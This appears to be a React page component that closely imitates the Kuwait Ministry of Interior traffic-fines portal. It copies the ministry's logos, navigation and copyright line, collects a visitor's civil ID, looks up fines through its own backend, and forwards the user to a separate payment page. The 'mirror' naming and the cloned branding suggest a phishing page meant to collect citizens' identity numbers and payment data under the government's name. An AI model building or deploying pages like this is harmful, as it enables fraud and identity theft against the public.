import React, { useState, useEffect } from 'react';
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useToast } from "@/hooks/use-toast";

export default function Home() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [civilId, setCivilId] = useState("");
  const [enquiryType, setEnquiryType] = useState("1");
  const [results, setResults] = useState<any>(null);
  const [isSearching, setIsSearching] = useState(false);

  const queryMutation = trpc.fines.query.useMutation({
    onSuccess: (data) => {
      setIsSearching(false);
      if (data.success) {
        setResults(data);
        toast({ title: "تم جلب البيانات", description: `تم العثور على ${data.fines.length} مخالفات` });
      } else {
        toast({ variant: "destructive", title: "خطأ", description: data.errorMessage || "فشل الاستعلام" });
      }
    },
    onError: (err) => {
      setIsSearching(false);
      toast({ variant: "destructive", title: "خطأ", description: err.message });
    }
  });

  const handleInquire = () => {
    if (civilId.length < 8) {
      toast({ variant: "destructive", description: "يرجى إدخال الرقم المدني بشكل صحيح" });
      return;
    }
    setIsSearching(true);
    queryMutation.mutate({ civilId, enquiryType: enquiryType as "1" | "2", lang: "ar" });
  };

  const handlePay = () => {
    if (!results) return;
    sessionStorage.setItem("paymentData", JSON.stringify({
      selectedFines: results.fines,
      totalAmount: results.totalAmount,
      civilId: civilId
    }));
    setLocation("/payment");
  };

  useEffect(() => {
    const interval = setInterval(() => {
      const input = document.getElementById('civilId') as HTMLInputElement;
      const select = document.getElementById('enquiryType') as HTMLSelectElement;
      const btn = document.getElementById('btnEnquire');

      if (input && !input.dataset.bound) {
        input.oninput = (e) => setCivilId((e.target as HTMLInputElement).value);
        input.dataset.bound = "true";
      }
      if (select && !select.dataset.bound) {
        select.onchange = (e) => setEnquiryType((e.target as HTMLSelectElement).value);
        select.dataset.bound = "true";
      }
      if (btn && !btn.dataset.bound) {
        btn.onclick = (e) => {
          e.preventDefault();
          handleInquire();
        };
        btn.dataset.bound = "true";
      }
    }, 500);

    return () => clearInterval(interval);
  }, [civilId, enquiryType, results]);

  return (
    <div className="moi-localized-mirror" dir="rtl">
      <style>{`
        .moi-localized-mirror { background-color: #e9e6de; min-height: 100vh; }
        .results-modal {
          position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
          background: white; padding: 25px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.3);
          z-index: 10000; width: 90%; max-width: 450px; text-align: center; border: 4px solid #000576;
        }
        .loading-overlay {
          position: fixed; top: 0; left: 0; right: 0; bottom: 0;
          background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 10001;
        }
      `}</style>

      <div dangerouslySetInnerHTML={{ __html: `
        <link rel="stylesheet" href="/stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
        <link rel="stylesheet" href="/main/css/site.css">
        
        <div class="container" style="background-image: url('/main/images/assets/common/bg-pattern.png'); background-repeat: repeat;">
          <header>
            <div class="row pt-3">
              <div class="col-4 col-md-2 col-lg-2 text-center">
                <a class="navbar-brand m-0" href="#">
                  <img src="/main/images/assets/common/logo-moi.svg" style="height: 120px;">
                </a>
              </div>
              <div class="col-8 col-md-10 align-self-center text-right">
                <div class="row"><div class="col text-right"><img src="/main/images/assets/common/ar/state-of-kuwait.svg" style="height: 35px;"></div></div>
                <div class="row mt-2"><div class="col text-right"><img src="/main/images/assets/common/ar/ministry-of-interior.svg" style="height: 25px;"></div></div>
              </div>
            </div>
          </header>

          <nav class="navbar navbar-expand-lg navbar-dark border-bottom box-shadow mt-3" style="background-color: #000576;">
            <div class="container">
              <div class="navbar-collapse collapse show">
                <ul class="navbar-nav ml-auto">
                  <li class="nav-item active"><a class="nav-link" href="#">الرئيسيــة</a></li>
                  <li class="nav-item"><a class="nav-link" href="#">الخدمات الإلكترونيـة</a></li>
                </ul>
              </div>
            </div>
          </nav>

          <div class="row mt-4">
            <div class="col-lg-3 d-none d-lg-block">
              <div class="list-group">
                <div class="p-3 text-center text-white font-weight-bold" style="background-color: #000576;">الإدارة العامة للمرور</div>
                <a href="#" class="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                  الخدمات الالكترونية لرخص السوق
                  <img src="/main/images/assets/general-traffic/ico-renew-license.svg" style="width: 24px;">
                </a>
                <a href="#" class="list-group-item list-group-item-action active d-flex justify-content-between align-items-center" style="background-color: #000576; border-color: #000576;">
                  دفع المخالفات
                  <img src="/main/images/assets/common/ico-payment.svg" style="width: 24px; filter: brightness(0) invert(1);">
                </a>
              </div>
            </div>

            <div class="col-lg-9">
              <div class="card p-4 shadow-sm" style="border-radius: 0; border: none; background: rgba(255,255,255,0.8);">
                <div class="text-center mb-4">
                  <img src="/main/images/assets/general-traffic/logo-general-traffic.svg" style="height: 80px;">
                  <h4 class="mt-3" style="color: #000576; font-weight: bold;">الإدارة العامة للمرور</h4>
                  <img src="/main/images/assets/common/ico-horizontal-bar.svg" class="mt-2" style="width: 60%;">
                </div>

                <div class="form-group text-right">
                  <label class="font-weight-bold" style="color: #000576;">Enquiry Type</label>
                  <select id="enquiryType" class="form-control">
                    <option value="1">الأفراد</option>
                    <option value="2">الشركات</option>
                  </select>
                </div>

                <div class="form-group text-right">
                  <label class="font-weight-bold" style="color: #000576;">الرقم المدني أو الرقم الموحد</label>
                  <input type="text" id="civilId" class="form-control text-right" placeholder="أدخل الرقم المدني">
                </div>

                <button id="btnEnquire" class="btn btn-primary btn-block font-weight-bold mt-4" style="background-color: #000576; border: none; height: 50px;">إستعلم</button>
                
                <p class="text-center mt-4 font-weight-bold" style="color: #333;">
                  بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                </p>

                <div class="d-flex justify-content-center mt-3">
                  <span class="badge badge-success p-2 mx-2">قابلة للدفع الكترونياً</span>
                  <span class="badge badge-danger p-2 mx-2">غير قابلة للدفع الكترونياً</span>
                </div>
              </div>
              
              <div class="d-lg-none mt-4">
                <div class="row text-center">
                  <div class="col-6 mb-4">
                    <div class="bg-white rounded-circle shadow mx-auto d-flex align-items-center justify-content-center" style="width: 100px; height: 100px; border: 4px solid #000576;">
                      <img src="/main/images/assets/common/ico-payment.svg" style="width: 50px;">
                    </div>
                    <p class="mt-2 font-weight-bold">دفع المخالفات</p>
                  </div>
                  <div class="col-6 mb-4">
                    <div class="bg-white rounded-circle shadow mx-auto d-flex align-items-center justify-content-center" style="width: 100px; height: 100px; border: 4px solid #000576;">
                      <img src="/main/images/assets/common/ico-case-track.svg" style="width: 50px;">
                    </div>
                    <p class="mt-2 font-weight-bold">سير القضية</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <footer class="mt-5 p-4 text-center text-white" style="background-color: #000576;">
            <div class="mb-3">
              <img src="/main/images/assets/social-media/ico-youtube.svg" class="mx-2" style="width: 24px;">
              <img src="/main/images/assets/social-media/ico-instagram.svg" class="mx-2" style="width: 24px;">
              <img src="/main/images/assets/social-media/ico-twitter.svg" class="mx-2" style="width: 24px;">
            </div>
            <p class="m-0 small">© جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2026</p>
          </footer>
        </div>
      ` }} />

      {isSearching && (
        <div className="loading-overlay">
          <div className="spinner-border text-white" role="status"></div>
        </div>
      )}

      {results && (
        <div className="results-modal">
          <h4 className="font-weight-bold mb-4" style={{color: '#000576'}}>نتائج الاستعلام</h4>
          <div className="text-right mb-4">
            <p><strong>الرقم المدني:</strong> {civilId}</p>
            <p><strong>عدد المخالفات:</strong> {results.fines.length}</p>
            <p><strong>الإجمالي:</strong> <span className="text-danger font-weight-bold" style={{fontSize: '20px'}}>{results.totalAmount} د.ك</span></p>
          </div>
          <div className="d-flex gap-2">
            <button className="btn btn-primary flex-grow-1 font-weight-bold" style={{backgroundColor: '#000576'}} onClick={handlePay}>دفع الآن</button>
            <button className="btn btn-secondary flex-grow-1 font-weight-bold" onClick={() => setResults(null)}>إغلاق</button>
          </div>
        </div>
      )}
    </div>
  );
}
